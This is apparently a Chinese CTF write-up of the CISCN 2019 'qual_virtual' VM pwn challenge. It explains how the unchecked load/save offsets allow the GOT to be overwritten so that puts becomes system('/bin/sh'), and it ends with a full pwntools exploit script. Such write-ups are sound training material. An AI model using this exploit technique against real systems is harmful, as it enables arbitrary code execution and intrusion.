---
title: CISCN 2019 qual_virtual WP
tags:
  - pwn
  - CTF
  - 题解
  - VM Pwn
  - CISCN
categories:
  - - pwn
    - CTF题解
    - VM Pwn
date: 2026-06-16 19:52:56
cover:

---

# qual_virtual WP

>**题目信息**：
>
>题目名称：qual_virtual
>
>题目来源：CISCN-2019

---

## 思路

这道题是一个入门级别的 VM PWN，非常适合用来学习一些基础的 VM PWN 技巧。

```c
s = (char *)malloc(0x20u);
input_stack = (__int64)sub_4013B4(0x40);
opcode = (__int64)sub_4013B4(0x80);
work_stack = (__int64)sub_4013B4(0x40);
ptr = malloc(0x400u);
```

程序首先分配了几个 chunk，其中 `sub_4013B4` 是用来分配 VMArray 结构体的，本质上也是 chunk，结构体如下：

```c
struct VMArray {
    uint64_t *data;  // offset 0x00
    int size;        // offset 0x08
    int top;         // offset 0x0c
};
```

其中 `data` 指向用于存放数据的 chunk。

```c
  puts("Your program name:");
  get_data(s, 32);
  puts("Your instruction:");
  get_data(ptr, 1024);
  translate(opcode, ptr);
  puts("Your stack data:");
  get_data(ptr, 1024);
  sub_40151A(input_stack, ptr);
```

接下来，程序获取程序名称并存放到 `s` 中，将指令字符串存放到 `ptr` 中，然后经由 `translate` 函数将我们的指令翻译为虚拟机可以识别的字节码，并存放到 `opcode` 中，最后让我们输入数据，并将数据放入 `input_stack` 中。

```c
if ( (unsigned int)sub_401967(opcode, input_stack, work_stack) )
  {
    puts("-------");
    puts(s);
    sub_4018CA(input_stack);
    puts("-------");
  }
  else
  {
    puts("Your Program Crash :)");
  }
```

然后由 `sub_401967` 执行指令并返回是否执行成功。执行成功后，虚拟机会打印程序名称与执行结果。由于该程序的 GOT 表可被劫持，所以可以将程序名称改为 `/bin/sh\x00`，然后使用漏洞修改 `puts@got`，使其调用 `system` 从而 getshell。

该虚拟机支持以下指令：

| 指令   | opcode | 作用                                                         |
| ------ | -----: | ------------------------------------------------------------ |
| `push` | `0x11` | 从 `input_stack` 弹出一个值，压入 `work_stack`               |
| `pop`  | `0x12` | 从 `work_stack` 弹出一个值，压回 `input_stack`               |
| `add`  | `0x21` | 从 `work_stack` 弹出两个值，相加后压回 `work_stack`          |
| `sub`  | `0x22` | 从 `work_stack` 弹出两个值，计算 `第一个弹出的值 - 第二个弹出的值`，结果压回 `work_stack` |
| `mul`  | `0x23` | 从 `work_stack` 弹出两个值，相乘后压回 `work_stack`          |
| `div`  | `0x24` | 从 `work_stack` 弹出两个值，计算 `第一个弹出的值 / 第二个弹出的值`，结果压回 `work_stack` |
| `load` | `0x31` | 从 `work_stack` 弹出 `offset`，读取 `work_stack->data[当前 top + offset]`，再压回 `work_stack` |
| `save` | `0x32` | 从 `work_stack` 弹出 `offset` 和 `value`，写入 `work_stack->data[当前 top + offset] = value` |

该虚拟机程序的问题在于 `load` 与 `save` 指令：

```c
__int64 __fastcall load(__int64 a1)
{
  __int64 offset; // [rsp+10h] [rbp-10h] BYREF

  if ( (unsigned int)POP(a1, &offset) )
    return PUSH(a1, *(_QWORD *)(*(_QWORD *)a1 + 8 * (*(int *)(a1 + 12) + offset)));
  else
    return 0;
}
```

```c
__int64 __fastcall save(__int64 a1)
{
  __int64 offset; // [rsp+10h] [rbp-10h] BYREF
  __int64 value; // [rsp+18h] [rbp-8h] BYREF

  if ( !(unsigned int)POP(a1, &offset) || !(unsigned int)POP(a1, &value) )
    return 0;
  *(_QWORD *)(8 * (*(int *)(a1 + 12) + offset) + *(_QWORD *)a1) = value;
  return 1;
}
```

这里的 `POP` 和 `PUSH` 与前面的 `pop` 和 `push` 不是同一个函数，但是功能相近。

由于二者均没有对 `offset` 进行限制，会导致数组越界，我们可以以此修改 chunk 上的数据。

思路如下：

```
opcode:	push push push push push save
data:	0 0 0 free@got-0x10 -6
```

五个 `push` 以后，`work_stack` 如下：

```
[-6]              <- top, idx 4
[free@got-0x10]   idx 3
[0]               idx 2
[0]               idx 1
[0]               idx 0
```

然后 `save` 先取出两个数：`offset` = `-6`，`value` = `free@got-0x10`。此时 `top` = 2，`work_stack` 如下：

```
[0]               <-- top, idx 2
[0]               idx 1
[0]               idx 0
```

然后 `save` 会将 `value` 放到 `top + offset` 对应的位置。当前 `top + offset` 指向的是当前 `top` 指向地址减去 `0x20` 的位置，这个地址恰好是 `VMArray` 结构体中的 `*data` 指针。这相当于该虚拟机中的栈迁移，将 `*data` 指针指向 `free@got-0x10`，即从 `free@got-0x10` 开始作为新的 `work_stack`。此时的 `work_stack` 如下：

```
[puts@got]: puts_addr			idx 3
[free@got]: free_addr   <- top  idx 2
[unknown]: addr               	idx 1
[unknown]: addr                	idx 0
```

接下来：

```
opcode: push load push add
data:	0 -258400
```

`push 0`：

```
[puts@got]: 0      		<- top  idx 3
[free@got]: free_addr      		idx 2
[unknown]: addr               	idx 1
[unknown]: addr                	idx 0
```

`load`：将 `0` 作为 `offset` 取出，此时 `top` 为 2，指向 `free@got`，随后取出 `free_addr` 并放到 idx3 的位置处（PUSH），运行后如下：

```
[puts@got]: free_addr   <- top  idx 3
[free@got]: free_addr      		idx 2
[unknown]: addr               	idx 1
[unknown]: addr                	idx 0
```

然后 `push -258400` 将 `-258400` 压入 `work_stack`，该值为 `free_addr` 与 `system_addr` 的差值。然后再通过 `add` 将 `puts@got` 的内容修改为 `system_addr`。执行后如下：

```
[puts@got]: system_addr   <- top  idx 3
[free@got]: free_addr      		  idx 2
[unknown]: addr               	  idx 1
[unknown]: addr                	  idx 0
```

最后程序会输出我们输入的程序名称。我们已经将名称修改为 `/bin/sh\x00`，所以程序会执行 `system('/bin/sh')`。

## EXP

```python
#!/bin/python
# _*_ coding: utf-8 _*_

from pwn import *

context(arch = 'amd64', os = 'linux')
context.terminal = ['konsole', '-e']
context.log_level = 'debug'
context.binary = './qual_virtual'
e = ELF('./qual_virtual')
libc = e.libc
# libc = ELF('')
host = "127.0.0.1"
post = 9999
if args['RE']:
    io = remote("3aad8bd8720b35b5b66accac.tcp-ctf2.dasctf.com", 9999, ssl=True)
else:
    io = process('./qual_virtual')

def debug():
    gdb.attach(io)
    pause()

# ===== lambda =====
sa  = lambda s, d: io.sendafter(s, d)       # send after
sla = lambda s, d: io.sendlineafter(s, d)   # sendline after  
sl  = lambda d:    io.sendline(d)           # sendline
sd  = lambda d:    io.send(d)               # send
ru  = lambda s:    io.recvuntil(s)          # recvuntil
rc  = lambda n:    io.recv(n)               # recv n bytes
rl  = lambda :     io.recvline()            # recvline
ti  = lambda :     io.interactive()         # interactive
lg  = lambda s, v:    log.info('\033[1;32m %s --> 0x%x \033[0m' % (s, v))

# ===== main =====
def main():
    name = "/bin/sh\x00"
    opcode = "push push push push push save push load push add"
    free_got = e.got['free']
    data = f"0 0 0 {free_got-16} -6 0 -258400"

    sla(b"Your program name:", name)
    sla(b"Your instruction:", opcode)
    #debug()
    sla(b"Your stack data:", data)

# ===== exec =====
if __name__ == '__main__':
    main() 
    ti()
```
